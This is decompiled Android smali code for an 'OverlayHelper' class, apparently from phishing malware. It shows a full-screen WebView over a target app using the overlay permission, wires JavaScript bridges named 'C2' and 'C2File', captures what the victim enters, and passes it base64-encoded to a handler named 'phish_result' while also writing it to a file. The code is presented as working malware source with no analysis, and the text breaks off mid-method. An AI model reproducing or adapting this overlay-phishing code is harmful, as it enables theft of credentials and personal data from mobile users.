.class final Lcom/servers/ozzbzk/OverlayHelper;
.super Ljava/lang/Object;


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/servers/ozzbzk/OverlayHelper$C2Bridge;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "OverlayHelper"


# instance fields
.field private final context:Landroid/content/Context;

.field private final lock:Ljava/lang/Object;

.field private final mainHandler:Landroid/os/Handler;

.field private volatile resultDelivered:Z

.field private volatile resultPath:Ljava/lang/String;

.field private volatile showing:Z

.field private volatile targetPkg:Ljava/lang/String;

.field private webView:Landroid/webkit/WebView;

.field private windowManager:Landroid/view/WindowManager;


# direct methods
.method static bridge synthetic -$$Nest$mdeliverResult(Lcom/servers/ozzbzk/OverlayHelper;Ljava/lang/String;Z)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/servers/ozzbzk/OverlayHelper;->deliverResult(Ljava/lang/String;Z)V

    return-void
.end method

.method constructor <init>(Landroid/content/Context;)V
    .locals 2

    .line 41
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 32
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->mainHandler:Landroid/os/Handler;

    .line 33
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->lock:Ljava/lang/Object;

    .line 37
    const-string v0, ""

    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->targetPkg:Ljava/lang/String;

    .line 38
    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    .line 42
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 43
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    :cond_0
    iput-object p1, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    return-void
.end method

.method private static buildDefaultHtml(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    if-eqz p0, :cond_0

    .line 284
    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    const-string p0, "System"

    .line 290
    :goto_0
    invoke-static {p0}, Lcom/servers/ozzbzk/OverlayHelper;->escape(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "<!DOCTYPE html><html><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><style>html,body{margin:0;padding:0;background:#111;color:#eee;font-family:sans-serif;height:100%;display:flex;align-items:center;justify-content:center;}div{padding:24px;text-align:center;}</style></head><body><div><h2>"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "</h2></div></body></html>"

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method private deliverResult(Ljava/lang/String;Z)V
    .locals 4

    const-string v0, "content://"

    .line 218
    iget-boolean v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultDelivered:Z

    if-eqz v1, :cond_0

    return-void

    :cond_0
    const/4 v1, 0x1

    .line 221
    iput-boolean v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultDelivered:Z

    .line 222
    invoke-direct {p0, p1, p2}, Lcom/servers/ozzbzk/OverlayHelper;->writeResultFile(Ljava/lang/String;Z)V

    .line 224
    :try_start_0
    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    .line 225
    const-string v2, "target_pkg"

    iget-object v3, p0, Lcom/servers/ozzbzk/OverlayHelper;->targetPkg:Ljava/lang/String;

    if-eqz v3, :cond_1

    iget-object v3, p0, Lcom/servers/ozzbzk/OverlayHelper;->targetPkg:Ljava/lang/String;

    goto :goto_0

    :cond_1
    const-string v3, ""

    :goto_0
    invoke-virtual {v1, v2, v3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 226
    const-string v2, "data_b64"

    const-string v3, "UTF-8"

    .line 227
    invoke-virtual {p1, v3}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    const/4 v3, 0x2

    invoke-static {p1, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p1

    .line 226
    invoke-virtual {v1, v2, p1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 228
    const-string p1, "dismissed"

    invoke-virtual {v1, p1, p2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 229
    iget-object p1, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object p1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".bridge"

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    .line 230
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "phish_result"

    const/4 v3, 0x0

    invoke-virtual {v0, p1, v2, v3, v1}, Landroid/content/ContentResolver;->call(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    .line 232
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "deliverResult: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "OverlayHelper"

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    if-nez p2, :cond_2

    .line 236
    iget-object p1, p0, Lcom/servers/ozzbzk/OverlayHelper;->mainHandler:Landroid/os/Handler;

    new-instance p2, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda1;

    invoke-direct {p2, p0}, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda1;-><init>(Lcom/servers/ozzbzk/OverlayHelper;)V

    const-wide/16 v0, 0x4b0

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    return-void
.end method

.method private static err(Ljava/lang/String;)Landroid/os/Bundle;
    .locals 3

    .line 276
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 277
    const-string v1, "success"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 278
    const-string v1, "status"

    const-string v2, "error"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    if-eqz p0, :cond_0

    goto :goto_0

    .line 279
    :cond_0
    const-string p0, ""

    :goto_0
    invoke-virtual {v0, v2, p0}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0
.end method

.method private static escape(Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    if-nez p0, :cond_0

    .line 295
    const-string p0, ""

    return-object p0

    .line 297
    :cond_0
    const-string v0, "&"

    const-string v1, "&amp;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, "<"

    const-string v1, "&lt;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, ">"

    const-string v1, "&gt;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const-string v0, "\""

    const-string v1, "&quot;"

    .line 298
    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method private hideLocked()V
    .locals 4

    const/4 v0, 0x0

    .line 198
    iput-boolean v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->showing:Z

    .line 199
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->windowManager:Landroid/view/WindowManager;

    const-string v1, "OverlayHelper"

    if-eqz v0, :cond_0

    iget-object v2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    if-eqz v2, :cond_0

    .line 201
    :try_start_0
    invoke-interface {v0, v2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 203
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "removeView: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 206
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    if-eqz v0, :cond_1

    .line 208
    :try_start_1
    invoke-virtual {v0}, Landroid/webkit/WebView;->destroy()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 210
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "destroyWebView: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_1
    const/4 v0, 0x0

    .line 213
    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    .line 214
    iput-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->windowManager:Landroid/view/WindowManager;

    return-void
.end method

.method private showOnMain(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/os/Bundle;
    .locals 10

    .line 108
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->lock:Ljava/lang/Object;

    monitor-enter v0

    .line 110
    :try_start_0
    invoke-direct {p0}, Lcom/servers/ozzbzk/OverlayHelper;->hideLocked()V

    const/4 v1, 0x0

    .line 111
    iput-boolean v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultDelivered:Z

    .line 112
    iput-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->targetPkg:Ljava/lang/String;

    .line 113
    iput-object p3, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    .line 115
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    const-string p3, "window"

    invoke-virtual {p2, p3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/view/WindowManager;

    iput-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->windowManager:Landroid/view/WindowManager;

    if-nez p2, :cond_0

    .line 117
    const-string p1, "no WindowManager"

    invoke-static {p1}, Lcom/servers/ozzbzk/OverlayHelper;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    return-object p1

    .line 120
    :cond_0
    :try_start_2
    new-instance p2, Landroid/webkit/WebView;

    iget-object p3, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    invoke-direct {p2, p3}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    .line 121
    invoke-virtual {p2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p2

    const/4 p3, 0x1

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 122
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    invoke-virtual {p2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p2

    invoke-virtual {p2, p3}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 123
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    new-instance v2, Landroid/webkit/WebViewClient;

    invoke-direct {v2}, Landroid/webkit/WebViewClient;-><init>()V

    invoke-virtual {p2, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 124
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    new-instance v2, Lcom/servers/ozzbzk/OverlayHelper$C2Bridge;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lcom/servers/ozzbzk/OverlayHelper$C2Bridge;-><init>(Lcom/servers/ozzbzk/OverlayHelper;Lcom/servers/ozzbzk/OverlayHelper$C2Bridge-IA;)V

    const-string v4, "C2"

    invoke-virtual {p2, v2, v4}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 125
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    new-instance v2, Lcom/servers/ozzbzk/OverlayHelper$C2Bridge;

    invoke-direct {v2, p0, v3}, Lcom/servers/ozzbzk/OverlayHelper$C2Bridge;-><init>(Lcom/servers/ozzbzk/OverlayHelper;Lcom/servers/ozzbzk/OverlayHelper$C2Bridge-IA;)V

    const-string v3, "C2File"

    invoke-virtual {p2, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 126
    iget-object v4, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    const-string v7, "text/html"

    const-string v8, "UTF-8"

    const/4 v9, 0x0

    const/4 v5, 0x0

    move-object v6, p1

    invoke-virtual/range {v4 .. v9}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 128
    new-instance p1, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {p1}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    .line 129
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt p2, v2, :cond_1

    const/16 p2, 0x7f6

    .line 130
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->type:I

    goto :goto_0

    :cond_1
    const/16 p2, 0x7d2

    .line 132
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->type:I

    :goto_0
    const/4 p2, -0x3

    .line 134
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->format:I

    const/16 p2, 0x720

    .line 135
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->flags:I

    const p2, 0x800033

    .line 139
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    const/4 p2, -0x1

    .line 140
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 141
    iput p2, p1, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 142
    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 143
    iput v1, p1, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 145
    iget-object p2, p0, Lcom/servers/ozzbzk/OverlayHelper;->windowManager:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->webView:Landroid/webkit/WebView;

    invoke-interface {p2, v1, p1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 146
    iput-boolean p3, p0, Lcom/servers/ozzbzk/OverlayHelper;->showing:Z

    .line 147
    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    .line 148
    const-string p2, "success"

    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 149
    const-string p2, "status"

    const-string p3, "ok"

    invoke-virtual {p1, p2, p3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 150
    :try_start_3
    monitor-exit v0

    return-object p1

    :catchall_0
    move-exception p1

    goto :goto_2

    :catch_0
    move-exception p1

    .line 152
    invoke-direct {p0}, Lcom/servers/ozzbzk/OverlayHelper;->hideLocked()V

    .line 153
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p2

    if-eqz p2, :cond_2

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :cond_2
    const-string p1, "overlay failed"

    :goto_1
    invoke-static {p1}, Lcom/servers/ozzbzk/OverlayHelper;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    monitor-exit v0

    return-object p1

    .line 155
    :goto_2
    monitor-exit v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    throw p1
.end method

.method private writeResultFile(Ljava/lang/String;Z)V
    .locals 4

    .line 241
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    .line 245
    :cond_0
    :try_start_0
    new-instance v0, Ljava/io/File;

    iget-object v1, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 246
    new-instance v1, Ljava/io/File;

    iget-object v2, p0, Lcom/servers/ozzbzk/OverlayHelper;->resultPath:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".tmp"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 247
    invoke-virtual {v0}, Ljava/io/File;->getParentFile()Ljava/io/File;

    move-result-object v2

    if-eqz v2, :cond_1

    .line 248
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    .line 249
    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    :cond_1
    if-eqz p2, :cond_2

    .line 251
    const-string p1, "{\"dismissed\":true}"

    .line 252
    :cond_2
    new-instance p2, Ljava/io/FileOutputStream;

    invoke-direct {p2, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 253
    const-string v2, "UTF-8"

    invoke-virtual {p1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/io/FileOutputStream;->write([B)V

    .line 254
    invoke-virtual {p2}, Ljava/io/FileOutputStream;->getFD()Ljava/io/FileDescriptor;

    move-result-object p1

    invoke-virtual {p1}, Ljava/io/FileDescriptor;->sync()V

    .line 255
    invoke-virtual {p2}, Ljava/io/FileOutputStream;->close()V

    .line 257
    invoke-virtual {v1, v0}, Ljava/io/File;->renameTo(Ljava/io/File;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 259
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "writeResultFile: "

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "OverlayHelper"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_3
    :goto_0
    return-void
.end method


# virtual methods
.method hide()Landroid/os/Bundle;
    .locals 5

    .line 159
    new-instance v0, Ljava/util/concurrent/CountDownLatch;

    const/4 v1, 0x1

    invoke-direct {v0, v1}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 160
    new-instance v2, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda0;

    invoke-direct {v2, p0, v0}, Lcom/servers/ozzbzk/OverlayHelper$$ExternalSyntheticLambda0;-><init>(Lcom/servers/ozzbzk/OverlayHelper;Ljava/util/concurrent/CountDownLatch;)V

    .line 169
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v3

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    if-ne v3, v4, :cond_0

    .line 170
    invoke-interface {v2}, Ljava/lang/Runnable;->run()V

    goto :goto_0

    .line 172
    :cond_0
    iget-object v3, p0, Lcom/servers/ozzbzk/OverlayHelper;->mainHandler:Landroid/os/Handler;

    invoke-virtual {v3, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 174
    :try_start_0
    sget-object v2, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x3

    invoke-virtual {v0, v3, v4, v2}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 176
    :catch_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 179
    :goto_0
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 180
    const-string v2, "success"

    invoke-virtual {v0, v2, v1}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 181
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0
.end method

.method synthetic lambda$hide$1$com-servers-ozzbzk-OverlayHelper(Ljava/util/concurrent/CountDownLatch;)V
    .locals 2

    .line 162
    :try_start_0
    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->lock:Ljava/lang/Object;

    monitor-enter v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 163
    :try_start_1
    invoke-direct {p0}, Lcom/servers/ozzbzk/OverlayHelper;->hideLocked()V

    .line 164
    monitor-exit v0
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 166
    invoke-virtual {p1}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    return-void

    :catchall_0
    move-exception v1

    .line 164
    :try_start_2
    monitor-exit v0
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    throw v1
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    :catchall_1
    move-exception v0

    .line 166
    invoke-virtual {p1}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    .line 167
    throw v0
.end method

.method synthetic lambda$show$0$com-servers-ozzbzk-OverlayHelper(Ljava/util/concurrent/atomic/AtomicReference;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/concurrent/CountDownLatch;)V
    .locals 0

    .line 78
    :try_start_0
    invoke-direct {p0, p2, p3, p4}, Lcom/servers/ozzbzk/OverlayHelper;->showOnMain(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 80
    invoke-virtual {p5}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    return-void

    :catchall_0
    move-exception p1

    invoke-virtual {p5}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    .line 81
    throw p1
.end method

.method show(Ljava/lang/String;Ljava/lang/String;)Landroid/os/Bundle;
    .locals 1

    const/4 v0, 0x0

    .line 47
    invoke-virtual {p0, p1, p2, v0}, Lcom/servers/ozzbzk/OverlayHelper;->show(Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method show(Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 12

    .line 51
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    const-string v2, "error"

    const/4 v3, 0x0

    const-string v4, "success"

    if-lt v0, v1, :cond_0

    iget-object v0, p0, Lcom/servers/ozzbzk/OverlayHelper;->context:Landroid/content/Context;

    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 52
    new-instance p1, Landroid/os/Bundle;

    invoke-direct {p1}, Landroid/os/Bundle;-><init>()V

    .line 53
    invoke-virtual {p1, v4, v3}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    .line 54
    const-string p2, "SYSTEM_ALERT_WINDOW not granted"

    invoke-virtual {p1, v2, p2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object p1

    :cond_0
    if-eqz p1, :cond_1

    .line 59
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 60
    :cond_1
    invoke-static {p2}, Lcom/servers/ozzbzk/OverlayHelper;->buildDefaultHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    :cond_2
    move-object v8, p1

    .line 65
    const-string p1, ""

    if-eqz p3, :cond_3

    .line 66
    const-string p2, "target_package"

    invoke-virtual {p3, p2, p1}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    const-string v0, "target_pkg"

